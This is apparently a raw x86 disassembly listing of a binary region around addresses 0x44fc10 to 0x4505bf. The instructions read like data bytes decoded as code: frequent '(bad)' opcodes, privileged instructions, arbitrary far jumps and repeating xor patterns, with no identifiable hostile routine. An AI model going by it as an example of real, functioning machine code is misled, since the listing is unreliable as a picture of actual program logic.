  44fc10:	add    BYTE PTR [eax],al
  44fc12:	jmp    0x44fc44
  44fc14:	in     al,dx
  44fc15:	xor    BYTE PTR [edx+esi*1],ch
  44fc18:	xchg   edi,eax
  44fc19:	xor    esp,esi
  44fc1b:	cs mov ecx,0x6f35eb35
  44fc21:	ss cs xor al,0x17
  44fc25:	aaa    
  44fc26:	push   esp
  44fc27:	xor    al,0x69
  44fc29:	aaa    
  44fc2a:	(bad)  
  44fc2b:	xor    eax,ebp
  44fc2d:	aaa    
  44fc2e:	shl    DWORD PTR [ebx],1
  44fc30:	push   cs
  44fc31:	cmp    BYTE PTR [ecx+0x29],bl
  44fc34:	pop    ebp
  44fc35:	cmp    BYTE PTR ds:0x456d3483,cl
  44fc3b:	nop
  44fc3c:	xor    al,0x86
  44fc3e:	xor    eax,0x359834c7
  44fc43:	or     esi,DWORD PTR ds:0x35a4240f
  44fc49:	xchg   DWORD PTR [eax],eax
	...
  44fc67:	add    BYTE PTR [edx+edi*8],ah
  44fc6a:	xor    eax,0x39df1761
  44fc6f:	mov    dl,0x17
  44fc71:	dec    ecx
  44fc72:	cmp    DWORD PTR [edx-0x46c874f7],edx
  44fc78:	add    DWORD PTR [ebp+0x37],ebx
  44fc7b:	cmp    eax,0xc23682f8
  44fc80:	lock xchg ebx,eax
  44fc82:	ss in  al,0xe8
  44fc85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fc86:	ss and eax,0xd435a1e3
  44fc8c:	fild   DWORD PTR [edi+0x30d21c35]
  44fc92:	xor    eax,0x34a44a49
  44fc97:	into   
  44fc98:	inc    edx
  44fc99:	jg     0x44fccf
  44fc9b:	add    BYTE PTR ds:0x72fe8c57,cl
  44fca1:	or     al,BYTE PTR [eax+eax*1]
  44fca4:	or     eax,0x1df32ca9
  44fca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fcaa:	xor    edx,DWORD PTR [edx+0x1c]
  44fcad:	push   ecx
  44fcae:	xor    edx,DWORD PTR [ebp+0x1c33171c]
  44fcb4:	call   DWORD PTR [ecx+0x32]
  44fcb7:	xchg   esp,eax
  44fcb8:	(bad)  
  44fcb9:	jnp    0x44fcec
  44fcbb:	(bad)  
  44fcbd:	sub    BYTE PTR [ecx],dh
  44fcbf:	or     bh,cl
  44fcc1:	adc    BYTE PTR [eax],dh
  44fcc3:	ds loope 0x44fc62
  44fcc6:	sub    BYTE PTR [esi-0x27],al
  44fcc9:	mov    WORD PTR [eax],gs
  44fccb:	dec    esi
	...
  44fce8:	add    BYTE PTR [eax],al
  44fcea:	loope  0x44fceb
  44fcec:	mov    eax,0xb933bb2f
  44fcf1:	das    
  44fcf2:	imul   esi,DWORD PTR [ecx+ecx*4],0x2f
  44fcf6:	imul   esi,DWORD PTR [ecx+edi*2],0x2f
  44fcfa:	imul   esi,DWORD PTR [ecx+edi*2],0x2f
  44fcfe:	jnp    0x44fd34
  44fd00:	jns    0x44fd31
  44fd02:	outs   dx,BYTE PTR ds:[esi]
  44fd03:	xor    eax,0x2d8d3d75
  44fd08:	add    al,0x39
  44fd0a:	fld    TBYTE PTR ds:0x2a8b3a3d
  44fd10:	nop
  44fd11:	cmp    edx,ebx
  44fd13:	sub    dl,al
  44fd15:	cmp    DWORD PTR ds:0xbba3e700,ecx
  44fd1b:	imul   ecx,edx,0x3
  44fd1e:	or     eax,0x82352f00
  44fd23:	xor    DWORD PTR [eax+0x162f0234],esp
  44fd29:	aaa    
  44fd2a:	dec    edi
  44fd2b:	xor    ch,BYTE PTR ds:0x35324732
  44fd31:	xor    bl,bh
  44fd33:	xor    DWORD PTR ds:0x531e732,ebp
  44fd39:	xor    ch,bh
  44fd3b:	xor    DWORD PTR ds:0xf531e732,ecx
  44fd41:	xor    edi,ebx
  44fd43:	xor    ebp,ebp
  44fd45:	xor    edi,esp
  44fd47:	xor    DWORD PTR [ebp+0x31],esp
  44fd4a:	(bad)  
  44fd4b:	xor    ch,BYTE PTR [ebp+0x31]
	...
  44fd6a:	add    BYTE PTR [eax],al
  44fd6c:	xchg   DWORD PTR [edx],esi
  44fd6e:	jne    0x44fda1
  44fd70:	lahf   
  44fd71:	xor    ch,BYTE PTR [ebp+0x31]
  44fd74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fd75:	xor    al,BYTE PTR [ebp-0x72cd90cf]
  44fd7b:	xor    DWORD PTR [edi+0x32],esp
  44fd7e:	jne    0x44fdb1
  44fd80:	pop    edi
  44fd81:	xor    al,BYTE PTR [eax]
  44fd83:	jae    0x44fd61
  44fd85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fd86:	xor    DWORD PTR [ebx],ebp
  44fd88:	fdivr  QWORD PTR ds:0x35dc3331
  44fd8e:	xor    DWORD PTR [ebx],edi
  44fd90:	cmp    al,0x4e
  44fd92:	xor    DWORD PTR [ebx],esi
  44fd94:	cmp    al,0x46
  44fd96:	xor    DWORD PTR [ebx],ecx
  44fd98:	cmp    al,0x5e
  44fd9a:	xor    DWORD PTR [ebx],edx
  44fd9c:	cmp    al,0x56
  44fd9e:	xor    ebx,edi
  44fda0:	sbb    eax,0x1df3316e
  44fda5:	xor    bx,bp
  44fda8:	pop    ds
  44fda9:	(bad)  
  44fdaa:	xor    bl,dh
  44fdac:	sbb    eax,0xfdfb30f6
  44fdb1:	or     eax,0x5fdf331
  44fdb6:	xor    DWORD PTR [ebx],ecx
  44fdb8:	cld    
  44fdb9:	sbb    eax,0x15fc1331
  44fdbe:	xor    ebx,edi
  44fdc0:	(bad)  ds:0x25ddf331
  44fdc6:	xor    DWORD PTR [ebx],ebp
  44fdc8:	fdivr  QWORD PTR [ebp-0x4a23ccd0]
  44fdce:	xor    BYTE PTR [ebx],bh
	...
  44fdec:	add    BYTE PTR [eax],al
  44fdee:	cmp    al,0xce
  44fdf0:	xor    BYTE PTR [ebx],dh
  44fdf2:	cmp    al,0xc6
  44fdf4:	xor    BYTE PTR [ebx],cl
  44fdf6:	cmp    al,0xde
  44fdf8:	xor    BYTE PTR [ebx],dl
  44fdfa:	cmp    al,0x5a
  44fdfc:	xor    cl,bh
  44fdfe:	es hlt 
  44fe00:	aaa    
  44fe01:	repz es out 0x37,al
  44fe05:	bound  ebx,QWORD PTR [ecx]
  44fe07:	jnp    0x44fe40
  44fe09:	mov    DWORD PTR [ecx],edx
  44fe0b:	mov    eax,ds:0xe9096137
  44fe10:	ss aaa 
  44fe12:	push   es
  44fe13:	daa    
  44fe14:	ss sar eax,0x7a
  44fe18:	xor    eax,0x2f29e400
  44fe1d:	cmp    ebx,DWORD PTR [ebx+ebp*1+0x58]
  44fe21:	cmp    edi,DWORD PTR [edx+0x2b]
  44fe24:	jb     0x44fe61
  44fe26:	mov    edx,0xe03b932c
  44fe2b:	sub    al,0xd6
  44fe2d:	cmp    edx,ebp
  44fe2f:	xor    DWORD PTR [ebx+0x3c],esp
  44fe32:	js     0x44fe5c
  44fe34:	stos   DWORD PTR es:[edi],eax
  44fe35:	cmp    al,0x26
  44fe37:	sub    BYTE PTR [eax],al
  44fe39:	add    ah,ah
  44fe3b:	lods   eax,DWORD PTR ds:[esi]
  44fe3c:	stc    
  44fe3d:	dec    DWORD PTR [eax-0x16000003]
  44fe43:	sub    eax,0x3443300b
  44fe48:	pop    edx
  44fe49:	xor    DWORD PTR [ebp*1+0x3348324c],edi
  44fe50:	and    BYTE PTR [ebx],dh
	...
  44fe6e:	add    BYTE PTR [eax],al
  44fe70:	cld    
  44fe71:	xor    ah,BYTE PTR [ebx-0x1bcb62cd]
  44fe77:	xor    ecx,edx
  44fe79:	xor    al,0x5
  44fe7b:	xor    al,0x12
  44fe7d:	xor    BYTE PTR [edx-0x49e675cc],cl
  44fe83:	xor    al,0x5c
  44fe85:	sbb    DWORD PTR [edx],eax
  44fe87:	xor    eax,0x37142fc8
  44fe8c:	push   es
  44fe8d:	xor    bh,al
  44fe8f:	aaa    
  44fe90:	and    BYTE PTR ds:0x25ad38a7,0xa
  44fe97:	cmp    DWORD PTR [esi+eiz*1-0x6c],ebp
  44fe9b:	cmp    DWORD PTR [eax+0x4d3a9026],eax
  44fea1:	sub    al,0x90
  44fea3:	cmp    ecx,DWORD PTR [ebp-0x7bc3add4]
  44fea9:	xor    DWORD PTR [eax],esp
  44feab:	cmp    eax,0x3ee23255
  44feb0:	or     eax,0xd0036d0
  44feb5:	push   edi
  44feb6:	cmp    al,0xfe
  44feb8:	xor    dh,BYTE PTR [edi+0x620dfffc]
  44febe:	sub    al,0x40
  44fec0:	fnsave [esi]
  44fec2:	sub    al,0xa0
  44fec4:	fadd   QWORD PTR [ecx-0x352355d3]
  44feca:	sub    eax,0x2e153cbc
  44fecf:	enter  0x273c,0x2e
  44fed3:	jmp    0x44fed5
	...
  44fef1:	add    BYTE PTR [ecx+edx*1],bh
  44fef4:	cs stc 
  44fef6:	cmp    al,0x6f
  44fef8:	xor    cl,BYTE PTR [edi]
  44fefa:	pop    ds
  44fefb:	pop    edi
  44fefc:	xor    bl,BYTE PTR [esi]
  44fefe:	pop    ds
  44feff:	aas    
  44ff00:	xor    ch,BYTE PTR [edi]
  44ff02:	pop    ds
  44ff03:	scas   eax,DWORD PTR es:[edi]
  44ff04:	xor    bh,BYTE PTR [ebx]
  44ff06:	pop    ds
  44ff07:	xor    BYTE PTR [esi],ch
  44ff09:	push   eax
  44ff0a:	jmp    ebx
  44ff0c:	sub    eax,0x2d7fff8e
  44ff11:	daa    
  44ff12:	inc    BYTE PTR ds:0x74fe742d
  44ff18:	sub    al,0xac
  44ff1a:	ficomp WORD PTR [eax+0x58ded62c]
  44ff20:	sub    BYTE PTR ds:0x422871e1,cl
  44ff26:	fnstenv [edx]
  44ff28:	xor    BYTE PTR [ecx+0x41],dl
  44ff2b:	wrmsr  
  44ff2d:	xchg   edx,eax
  44ff2e:	cmp    DWORD PTR [esi-0x64be2fd1],esi
  44ff34:	das    
  44ff35:	add    al,0x38
  44ff37:	inc    edi
  44ff38:	das    
  44ff39:	adc    eax,0x842f5020
  44ff3e:	sbb    dh,bl
  44ff40:	cs fwait
  44ff42:	and    BYTE PTR [edi],ah
  44ff44:	das    
  44ff45:	mov    bh,0x18
  44ff47:	add    BYTE PTR [eax+0x31],bl
  44ff4a:	cmp    al,0x32
  44ff4c:	in     eax,0x2d
  44ff4e:	adc    dh,BYTE PTR [edx]
  44ff50:	stc    
  44ff51:	sub    eax,0x2e1731f1
	...
  44ff72:	add    BYTE PTR [eax],al
  44ff74:	enter  0xa431,0x2d
  44ff78:	enter  0xd031,0x2d
  44ff7c:	sahf   
  44ff7d:	xor    DWORD PTR [ebx+0x5031862d],esi
  44ff83:	cs pop ebp
  44ff85:	xor    DWORD PTR [ebx],edi
  44ff87:	cs in  al,0x2e
  44ff8a:	add    ch,BYTE PTR [esi]
  44ff8c:	imul   DWORD PTR [esi]
  44ff8e:	sbb    ebp,DWORD PTR [esi]
  44ff90:	adc    ebp,DWORD PTR [edi]
  44ff92:	cwde   
  44ff93:	cs jp  0x44ffc5
  44ff96:	push   0x582f8c2f
  44ff9b:	das    
  44ff9c:	test   DWORD PTR [edi],ebp
  44ff9e:	dec    ebx
  44ff9f:	das    
  44ffa0:	retf   
  44ffa1:	das    
  44ffa2:	imul   edi,DWORD PTR [ebx],0x3b192b00
  44ffa8:	fwait
  44ffa9:	sub    eax,DWORD PTR [ebx-0x6fdb8fc6]
  44ffaf:	aaa    
  44ffb0:	retf   
  44ffb1:	and    al,0xc1
  44ffb3:	aaa    
  44ffb4:	or     BYTE PTR ds:0x24f93905,ah
  44ffba:	push   0x38
  44ffbc:	jg     0x44ffe3
  44ffbe:	ja     0x44fff8
  44ffc0:	xchg   ebp,eax
  44ffc1:	and    eax,0x264b35e6
  44ffc6:	in     al,dx
  44ffc7:	ss mov ah,0x27
  44ffca:	push   esp
  44ffcb:	ss popa 
  44ffcd:	daa    
  44ffce:	fwait
  44ffcf:	ss or  eax,0x7353e700
  44ffd5:	addr16 pop edx
  44ffd7:	add    eax,DWORD PTR [eax]
	...
  44fff5:	add    BYTE PTR ds:0x9a336000,cl
  44fffb:	xor    DWORD PTR [eax],eax
  44fffd:	fistp  WORD PTR [eax+edi*4]
  450000:	sub    eax,0x2d881c58
  450005:	sub    esp,edi
  450007:	push   edx
  450008:	sub    eax,0x2d5afc4a
  45000d:	pop    esi
  45000e:	cld    
  45000f:	jmp    FWORD PTR [esp+ebx*8]
  450012:	dec    DWORD PTR ds:0xb5dfb22d
  450018:	sub    al,0xbb
  45001a:	fistp  QWORD PTR [eax+0x2c]
  45001d:	mov    edi,ds
  45001f:	scas   eax,DWORD PTR es:[edi]
  450020:	sub    al,0x3a
  450022:	fisttp WORD PTR [esi]
  450024:	xor    al,0xb3
  450026:	cmp    dh,al
  450028:	xor    edi,DWORD PTR [ebp+0x32]
  45002b:	dec    esp
  45002c:	xor    edi,ebx
  45002e:	cmp    eax,0x3d903327
  450033:	mov    cl,0x32
  450035:	xor    bl,BYTE PTR ds:0x1d0a3244
  45003b:	outs   dx,DWORD PTR ds:[esi]
  45003c:	xor    dh,BYTE PTR [eax+ebp*1+0x2032317e]
  450043:	ss xor eax,eax
  450046:	sti    
  450047:	pop    eax
  450048:	xor    edx,esi
  45004a:	icebp  
  45004b:	or     esi,DWORD PTR [ecx]
  45004d:	add    eax,0x4230bbe8
  450052:	loopne 0x450096
  450054:	xor    dh,cl
  450056:	clc    
  450057:	and    bh,BYTE PTR [eax]
  450059:	test   DWORD PTR [eax],0x0
	...
  450077:	add    dh,ah
  450079:	cmp    esi,DWORD PTR ds:0x34b7d7b5
  45007f:	cs aam 0x6e
  450082:	xor    al,0xe5
  450084:	inc    edx
  450085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450086:	cmp    eax,DWORD PTR [ebp+eax*2+0x423c3b23]
  45008d:	out    0x3a,al
  45008f:	dec    esi
  450090:	cmp    bl,BYTE PTR [ebx+0x3a]
  450093:	add    BYTE PTR [esi+ebp*1],cl
  450096:	mov    BYTE PTR [esi],bh
  450098:	mov    bl,0x2d
  45009a:	ss aas 
  45009c:	out    0x2c,eax
  45009e:	test   al,0x3f
  4500a0:	jo     0x4500ce
  4500a2:	fistp  QWORD PTR [edi]
  4500a4:	xor    al,0xe2
  4500a6:	stc    
  4500a7:	dec    DWORD PTR [ebx+edi*8+0x2c06ffff]
  4500ae:	aaa    
  4500af:	xor    BYTE PTR [ecx-0x71cf7fce],dl
  4500b5:	sub    eax,DWORD PTR [ecx+esi*1]
  4500b8:	shl    DWORD PTR [edx],cl
  4500ba:	shl    BYTE PTR [edx],0x4f
  4500bd:	das    
  4500be:	mov    dh,BYTE PTR [ebx]
  4500c0:	loop   0x4500f2
  4500c2:	and    al,0x34
  4500c4:	scas   al,BYTE PTR es:[edi]
  4500c5:	adc    eax,0x30333493
  4500ca:	aaa    
  4500cb:	xor    eax,0x35851688
  4500d0:	pusha  
  4500d1:	adc    eax,0x13b33600
  4500d6:	pop    ebp
  4500d7:	ss xor al,0x16
  4500da:	div    BYTE PTR [esi]
	...
  4500f8:	add    BYTE PTR [eax],al
  4500fa:	inc    edx
  4500fb:	adc    esi,DWORD PTR [ebx+0x38]
  4500fe:	cmp    esp,DWORD PTR [esp+ebp*4]
  450101:	cmp    BYTE PTR [esi+0x12391e2a],bh
  450107:	sub    DWORD PTR [eax],edi
  450109:	cmp    edi,ebp
  45010b:	sub    BYTE PTR [ecx+edi*1+0x4c],dl
  45010f:	sub    DWORD PTR [edi+0x39],esp
  450112:	sbb    eax,0x5d39a02a
  450117:	sub    bl,dl
  450119:	cmp    DWORD PTR [eax],ecx
  45011b:	sub    al,BYTE PTR [edx+0x3a]
  45011e:	clc    
  45011f:	sub    DWORD PTR [edx+0x3a],edx
  450122:	sbb    BYTE PTR [edx],ch
  450124:	lds    edi,FWORD PTR [edx]
  450126:	mov    eax,ds:0xd3b0127
  45012b:	cmp    DWORD PTR [edi],esi
  45012d:	ss ss sti 
  450130:	ss ins DWORD PTR es:[edi],dx
  450132:	add    BYTE PTR es:[edi],dh
  450135:	and    DWORD PTR [esi],0x19e530bc
  45013b:	out    0x30,al
  45013d:	sub    BYTE PTR [eax],dl
  45013f:	scas   al,BYTE PTR es:[edi]
  450140:	xor    DWORD PTR [esi],edi
  450142:	or     BYTE PTR [edx],bl
  450144:	xor    ch,BYTE PTR [eax]
  450146:	add    ebp,DWORD PTR [esi-0x6c05e0ce]
  45014c:	xor    ebp,DWORD PTR [ebp-0xe]
  45014f:	shl    BYTE PTR [ebx],cl
  450151:	mov    ds:0xd7342eea,eax
  450156:	loop   0x45015d
  450158:	xor    al,0xf8
  45015a:	ficom  DWORD PTR [esi+0x6c]
  45015d:	inc    BYTE PTR [eax]
	...
  45017b:	add    BYTE PTR [edx],dl
  45017d:	mov    bl,0xfc
  45017f:	dec    DWORD PTR ds:0x3d8b2cd4
  450185:	jmp    0xa72c:0xb83d972c
  45018c:	cmp    eax,0x1db72cc8
  450191:	sbb    ch,BYTE PTR ds:0x2d031dcb
  450197:	jecxz  0x4501b6
  450199:	sub    ax,0x1c00
  45019d:	dec    ecx
  45019e:	sub    eax,0x330bfc15
  4501a3:	xor    al,0xfc
  4501a5:	and    BYTE PTR [ebx],dh
  4501a7:	ds cld 
  4501a9:	and    BYTE PTR [ebx],dh
  4501ab:	dec    esi
  4501ac:	cld    
  4501ad:	adc    esi,DWORD PTR [ebx]
  4501af:	int3   
  4501b0:	fistp  WORD PTR [ebp+0x2cd9ec37]
  4501b6:	aaa    
  4501b7:	(bad)  
  4501b8:	loopne 0x450230
  4501ba:	ss scas al,BYTE PTR es:[edi]
  4501bc:	fsubr  st,st(7)
  4501be:	ss ret 0x40
  4501c2:	mov    edi,0x9d2a6a39
  4501c7:	cmp    DWORD PTR [edx+0x2a],edi
  4501ca:	cli    
  4501cb:	cmp    edi,ebx
  4501cd:	sub    eax,0x2d943a2b
  4501d2:	pop    esp
  4501d3:	cmp    ch,BYTE PTR [ebp+0x2d]
  4501d6:	cmp    bp,WORD PTR [ebx-0x16d3e2d4]
  4501dd:	es fwait
  4501df:	sub    eax,0x0
	...
  4501fc:	add    BYTE PTR [eax],al
  4501fe:	xor    DWORD PTR [esi],esp
  450200:	jmp    0x45022f
  450202:	inc    esp
  450203:	sub    DWORD PTR [eax+0x328332e],edi
  450209:	xor    dl,ah
  45020b:	and    edi,DWORD PTR [eax-0x1bdd00d1]
  450211:	xor    cl,dh
  450213:	and    bl,BYTE PTR [ebx+0x44228830]
  450219:	xor    cl,ah
  45021b:	and    al,0x9c
  45021d:	xor    bl,BYTE PTR [edi+0x23]
  450220:	ret    
  450221:	xor    ch,BYTE PTR [edx+0x23]
  450224:	xchg   edx,eax
  450225:	xor    cl,BYTE PTR [edi-0x57ccb8dd]
  45022b:	and    ecx,DWORD PTR [edi+0x33]
  45022e:	shl    BYTE PTR [ebx],cl
  450230:	add    eax,0xe723f333
  450235:	add    ebx,ebx
  450237:	arpl   WORD PTR [edx],bx
  450239:	add    al,0xd
  45023b:	add    ah,cl
  45023d:	xor    edx,DWORD PTR [eax+0x30]
  450240:	cmp    BYTE PTR [edx+ebx*2],dh
  450243:	xor    BYTE PTR [edi+0x34],al
  450246:	xor    eax,0x93336030
  45024b:	xor    BYTE PTR [ebp-0x61cf96cd],dl
  450251:	xor    edi,edi
  450253:	xor    ah,bl
  450255:	xor    al,0xe2
  450257:	xor    BYTE PTR [eax],al
  450259:	pop    edx
  45025a:	fld    DWORD PTR [ecx+0x5b418c2e]
  450260:	adc    al,BYTE PTR cs:[eax]
	...
  45027f:	add    BYTE PTR [ebx],bh
  450281:	out    0x2d,al
  450283:	lds    eax,FWORD PTR [edx-0x42]
  450286:	xor    esp,DWORD PTR ds:0x7133d335
  45028c:	and    al,BYTE PTR [esi-0x57e5adcd]
  450292:	xor    edi,DWORD PTR [edi]
  450294:	and    dl,BYTE PTR [esi]
  450296:	xor    edx,DWORD PTR [esp+edx*1]
  450299:	lds    esi,FWORD PTR [ecx]
  45029b:	out    dx,eax
  45029c:	add    al,0x8f
  45029e:	xor    DWORD PTR [ebp+0x5a314c04],eax
  4502a4:	hlt    
  4502a5:	push   cs
  4502a6:	xor    DWORD PTR [edx+0x713071f7],esp
  4502ac:	out    0xad,eax
  4502ae:	xor    BYTE PTR [edi+0x4b303ee7],al
  4502b4:	xlat   BYTE PTR ds:[ebx]
  4502b5:	pop    edx
  4502b6:	xor    BYTE PTR [ebx],bh
  4502b8:	xlat   BYTE PTR ds:[ebx]
  4502b9:	push   DWORD PTR [edi]
  4502bb:	out    0x36,al
  4502bd:	stc    
  4502be:	aaa    
  4502bf:	iret   
  4502c0:	ss sub eax,0xc826b938
  4502c6:	aaa    
  4502c7:	mov    ah,0x26
  4502c9:	shl    DWORD PTR [edi],cl
  4502cb:	xchg   ecx,eax
  4502cc:	ss out 0x37,al
  4502cf:	outs   dx,BYTE PTR ds:[esi]
  4502d0:	ss ja  0x45030a
  4502d3:	aas    
  4502d4:	es cmp al,0x37
  4502d7:	daa    
  4502d8:	es dec eax
  4502da:	aaa    
  4502db:	add    dh,dh
  4502dd:	push   edx
  4502de:	aaa    
  4502df:	loope  0x4502d2
  4502e1:	push   DWORD PTR [esi]
  4502e3:	icebp  
	...
  450300:	add    BYTE PTR [eax],al
  450302:	out    0xf8,eax
  450304:	ss icebp 
  450306:	out    0x19,eax
  450308:	aaa    
  450309:	push   edi
  45030b:	sub    esi,DWORD PTR [edi]
  45030d:	add    BYTE PTR [ecx],cl
  45030f:	pop    ss
  450310:	ret    
  450311:	cmp    DWORD PTR [esi+0x16],esi
  450314:	sar    DWORD PTR [ecx],cl
  450316:	(bad)  
  450317:	push   ss
  450318:	push   cs
  450319:	cmp    bl,BYTE PTR [ecx+0x14]
  45031c:	push   ds
  45031d:	cmp    bl,BYTE PTR [ecx+0x14]
  450320:	stos   DWORD PTR es:[edi],eax
  450321:	cmp    ah,al
  450323:	adc    al,0xca
  450325:	cmp    esp,esi
  450327:	adc    al,BYTE PTR [ecx+0x1d128a3d]
  45032d:	ds pop ss
  45032f:	cs gs fsubr QWORD PTR ds:0x2da53eb1
  450338:	sar    DWORD PTR [esi],0xa5
  45033b:	sub    eax,0x2dd53ed1
  450340:	loope  0x450380
  450342:	sub    al,0x2f
  450344:	jbe    0x450385
  450346:	and    al,0xe
  450348:	cli    
  450349:	(bad)  
  45034a:	jl     0x450347
  45034c:	(bad)  
  45034d:	jmp    DWORD PTR [edx+0x2e]
  450350:	jl     0x450382
  450352:	mov    ch,0x2b
  450354:	das    
  450355:	xor    DWORD PTR [esi+ebp*1+0x2d63317e],esp
  45035c:	lahf   
  45035d:	xor    DWORD PTR [edi+0x2d],ebp
  450360:	mov    ecx,0xc2d2931
  450365:	xor    al,BYTE PTR [eax]
	...
  450383:	add    BYTE PTR [edi+0x5b32622b],al
  450389:	sub    al,BYTE PTR [edx-0x4bd4c5cd]
  45038f:	xor    ecx,DWORD PTR [esi+0x29]
  450392:	fidiv  WORD PTR ds:0x360d2adf
  450398:	test   BYTE PTR [edi],ah
  45039a:	ds ss add eax,0x62366726
  4503a1:	mov    BYTE PTR es:[esi],dh
  4503a4:	or     eax,0xe3bf367b
  4503a9:	popf   
  4503aa:	ss (bad) 
  4503ac:	(bad)  [ecx+0x43e20236]
  4503b2:	aaa    
  4503b3:	push   eax
  4503b4:	fidiv  DWORD PTR [ecx+0x7c428e36]
  4503ba:	aaa    
  4503bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4503bc:	cmp    al,bl
  4503be:	aaa    
  4503bf:	mov    ch,0x42
  4503c1:	lahf   
  4503c2:	aaa    
  4503c3:	daa    
  4503c4:	xor    eax,0x25742c1e
  4503c9:	frstor [ecx+eax*8]
  4503cc:	and    eax,0x15dd2487
  4503d1:	(bad)  
  4503d2:	and    al,0xf0
  4503d4:	adc    eax,0x47025a6
  4503d9:	push   esp
  4503da:	and    eax,0x2585049a
  4503df:	loop   0x4503d5
  4503e1:	(bad)  
  4503e2:	and    eax,0x29f2f711
  4503e7:	push   0x0
	...
  450405:	add    bh,ah
  450407:	shr    DWORD PTR [edx],0x9f
  45040a:	out    0xb7,eax
  45040c:	sub    al,BYTE PTR [edi]
  45040e:	(bad)  
  45040f:	push   ecx
  450410:	sub    esp,DWORD PTR [edx]
  450412:	(bad)  
  450413:	test   al,0x2b
  450415:	scas   al,BYTE PTR es:[edi]
  450416:	inc    esi
  450417:	lock sub ecx,ebp
  45041a:	inc    esi
  45041b:	mov    esi,0xfd36f52b
  450420:	das    
  450421:	and    DWORD PTR [ecx],esi
  450423:	mov    esi,0x2729b628
  450428:	sub    edi,edx
  45042a:	and    esp,edi
  45042c:	sub    BYTE PTR [edx+0x18],ch
  45042f:	mov    dh,0x29
  450431:	adc    BYTE PTR [ebx],dl
  450433:	scas   al,BYTE PTR es:[edi]
  450434:	bound  ecx,QWORD PTR cs:[ebx]
  450437:	inc    esi
  450438:	das    
  450439:	mov    ds:0x23e70002,eax
  45043e:	mov    ebx,0xd04c660
  450443:	add    BYTE PTR [eax+0x35],ch
  450446:	mov    BYTE PTR [esi],ch
  450448:	lahf   
  450449:	xor    eax,0x31fe2ea8
  45044e:	adc    eax,0x7c33642d
  450453:	sub    al,0x78
  450455:	xor    edi,DWORD PTR [esp+ebp*1+0x2c643398]
  45045c:	lahf   
  45045d:	xor    esi,DWORD PTR [edi+0x2c]
  450460:	jmp    0x2037:0xdc2c1037
  450467:	sub    al,0x29
  450469:	cmp    BYTE PTR [eax],al
	...
  450487:	add    ah,dh
  450489:	sub    eax,DWORD PTR [eax]
  45048b:	cmp    BYTE PTR [ebx+ebp*1+0x2bac3854],al
  450492:	inc    esp
  450493:	cmp    BYTE PTR [eax+0x6438912b],cl
  450499:	sub    ecx,DWORD PTR [eax+edi*1+0x35]
  45049d:	sub    ebx,DWORD PTR [ecx+0x38]
  4504a0:	sbb    al,0x2b
  4504a2:	or     DWORD PTR [ecx],edi
  4504a4:	loopne 0x4504d0
  4504a6:	mov    dh,0x38
  4504a8:	test   eax,0x7c38b52a
  4504ad:	sub    bh,BYTE PTR [edx+0x39]
  4504b0:	sub    ch,BYTE PTR [edx]
  4504b2:	(bad)  ds:0x36c5165b
  4504b8:	jb     0x4504d1
  4504ba:	call   0x8637:0x61177636
  4504c1:	pop    ss
  4504c2:	jbe    0x4504fb
  4504c4:	scas   al,BYTE PTR es:[edi]
  4504c5:	pop    ss
  4504c6:	inc    eax
  4504c7:	aaa    
  4504c8:	mov    ah,0x17
  4504ca:	cmp    dh,BYTE PTR [edi]
  4504cc:	(bad)  
  4504cd:	pop    ss
  4504ce:	out    0x2b,al
  4504d0:	add    DWORD PTR [eax],ebx
  4504d2:	add    dl,bl
  4504d4:	div    dh
  4504d6:	aaa    
  4504d7:	ret    0x28f6
  4504da:	cmp    BYTE PTR [ecx+ebp*8],bl
  4504dd:	sbb    bh,BYTE PTR [eax]
  4504df:	dec    edx
  4504e0:	loope  0x4504b2
  4504e2:	aaa    
  4504e3:	stos   DWORD PTR es:[edi],eax
  4504e4:	neg    BYTE PTR [edx+0x37]
  4504e7:	in     eax,dx
  4504e8:	icebp  
  4504e9:	sub    DWORD PTR [edi],esi
  4504eb:	sub    BYTE PTR [eax],al
	...
  450509:	add    al,ch
  45050b:	mov    dh,0x36
  45050d:	dec    ebx
  45050e:	loopne 0x4504e3
  450510:	ss cmp DWORD PTR fs:[esi+0x2231c136],esp
  450518:	ss push eax
  45051a:	and    al,0x9c
  45051c:	xor    eax,0x356e24be
  450521:	loop   0x45055a
  450523:	mov    ch,0x34
  450525:	add    al,0x36
  450527:	fbstp  TBYTE PTR [eax+eax*2]
  45052a:	daa    
  45052b:	lock cmp eax,esp
  45052e:	and    ch,BYTE PTR ds:0xadfd283c
  450534:	cmp    ebx,esp
  450536:	std    
  450537:	clc    
  450538:	cmp    al,bh
  45053a:	std    
  45053b:	loop   0x450577
  45053d:	int3   
  45053e:	std    
  45053f:	fnstcw WORD PTR [edx]
  450541:	jae    0x450520
  450543:	inc    esi
  450544:	cmp    dh,bh
  450546:	lock int3 
  450548:	cmp    ebx,edx
  45054a:	call   0xe08a3ecb
  45054f:	add    bh,BYTE PTR [ecx]
  450551:	or     al,0x3a
  450553:	in     al,0x38
  450555:	and    eax,0xe9000033
  45055a:	ds pop esi
  45055c:	clc    
  45055d:	cmp    DWORD PTR [esi],ecx
  45055f:	add    BYTE PTR [eax],al
  450561:	in     al,dx
  450562:	push   ds
  450563:	es xor dh,cl
  450566:	push   ds
  450567:	enter  0x2f,0xa3
  45056b:	adc    cl,BYTE PTR [ebp+0x30]
	...
  45058a:	add    BYTE PTR [eax],al
  45058c:	mov    edx,DWORD PTR [edx]
  45058e:	arpl   WORD PTR [eax],si
  450590:	inc    ebp
  450591:	adc    edi,DWORD PTR [eax+0x30]
  450594:	sub    edx,DWORD PTR [ebx]
  450596:	lods   al,BYTE PTR ds:[esi]
  450597:	xor    BYTE PTR [edi+0x13],bh
  45059a:	retf   0xcd30
  45059d:	adc    edx,edi
  45059f:	xor    ah,al
  4505a1:	adc    esi,esp
  4505a3:	xor    BYTE PTR [esi-0x47cf05ed],bh
  4505a9:	adc    DWORD PTR [esi],ebx
  4505ab:	xor    edx,esp
  4505ad:	adc    dl,BYTE PTR [ecx+esi*1+0x32011255]
  4505b4:	pop    esi
  4505b5:	adc    BYTE PTR [ebx],bl
  4505b7:	xor    bl,BYTE PTR [esi+0x10]
  4505ba:	xor    BYTE PTR [edx],dh
  4505bc:	adc    bh,BYTE PTR es:[esi]
  4505bf:	xor    dh,BYTE PTR [eax]
